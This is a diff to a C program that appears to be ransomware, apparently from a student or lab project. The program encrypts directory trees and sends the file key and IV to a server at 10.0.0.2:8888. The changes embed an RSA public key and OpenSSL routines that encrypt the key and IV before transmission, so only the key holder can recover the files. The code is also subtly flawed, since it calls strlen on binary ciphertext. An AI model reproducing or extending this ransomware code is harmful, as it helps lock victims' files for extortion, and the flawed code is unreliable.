@@ -6,8 +6,30 @@
 #include <openssl/rand.h>
 #include <stdio.h>
 #include <errno.h>
+#include <openssl/pem.h>
+#include <openssl/ssl.h>
+#include <openssl/rsa.h>
+#include <openssl/evp.h>
+#include <openssl/bio.h>
+#include <openssl/err.h>
+
+char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
+"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaSs3J+sdyTWIGiYOuWe\n"\
+"PVjbJoI42eUzHrJpAuVhwaHsVREKdFSYG4LP7SdFLtAQxSDQYBqwe5gLfJk/E89j\n"\
+"cWnhDL5Kqnz4ihyfyk31zJxEdzjxccs7LTiXY5IuFPsOpxZJjf5xPIopqjiBcbxi\n"\
+"+/+jTWfG5xT8gh8PbqpRnVi5/qQqD/4tXkCXeNsJ4yJSFOymhmTieclXkDakPzQJ\n"\
+"2jLnBUA0pEeDBoeVMKLsib+FPdC6BN/hVT4n56xvln7J1tbtMM/ujT1mH/KKndgA\n"\
+"xqd8R5PZRhudSQGNg6UrhmlsmS1OUdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p\n"\
+"+wIDAQAB\n"\
+"-----END PUBLIC KEY-----\n";
+int padding = RSA_PKCS1_PADDING;
+
 
 void handleError(int sockid);
+
+RSA * createRSA(unsigned char * key, int public); //Create RSA structure used for encryption and decryption
+
+int public_encrypt(unsigned char * data, int data_len, unsigned char * key, unsigned char *encrypted);
 
 int is_encrypted(char *filename);
 
@@ -19,6 +41,9 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr);
 
 int main (int argc, char * argv[])
 {
+
+
+    
     int sockid;
     int server_port = 8888;
     char *server_ip = "10.0.0.2";
@@ -43,6 +68,7 @@ int main (int argc, char * argv[])
     if (bind(sockid, (struct sockaddr *)&client_addr, sizeof(client_addr))<0)
     {
         printf("Error during binding\n");
+        printf("%s\n", strerror(errno));
         handleError(sockid);
         
     }
@@ -122,7 +148,6 @@ int main (int argc, char * argv[])
             iv[size-1] = '\0';  //removing \n from the iv
             hexa_to_bytes(pKey, key,sizeKey);
             hexa_to_bytes(pIv, iv,sizeKey);
-
             char response[2048];
             strcpy(response, cwd);
             strcat(response, " ");
@@ -233,15 +258,22 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
     }
 }
 
+int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted)
+{
+    RSA * rsa = createRSA(key,1);
+    int result = RSA_public_encrypt(data_len,data,encrypted,rsa,padding);
+    return result;
+}
 int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
 {
-    
+    unsigned char  encrypted[4098]={};
     char *msg = malloc(strlen(pKey)+strlen(pIv)+2);  // Format du message key:Iv
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
+    public_encrypt((unsigned char*)msg, strlen(msg), publicKey, encrypted);
     
-    send(sockid, (const char *)msg, strlen(msg)+1,0);
+    send(sockid, (const char *)encrypted, strlen(encrypted)+1,0);
     free(msg);
 }
 
@@ -265,4 +297,29 @@ void handleError(int sockid)
     close(sockid);
     abort();
 
+}
+RSA * createRSA(unsigned char * key,int public)
+{
+    RSA *rsa= NULL;
+    BIO *keybio ;
+    keybio = BIO_new_mem_buf(key, -1);
+    if (keybio==NULL)
+    {
+        printf( "Failed to create key BIO");
+        return 0;
+    }
+    if(public)
+    {
+        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
+    }
+    else
+    {
+        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
+    }
+    if(rsa == NULL)
+    {
+        printf( "Failed to create RSA");
+    }
+ 
+    return rsa;
 }
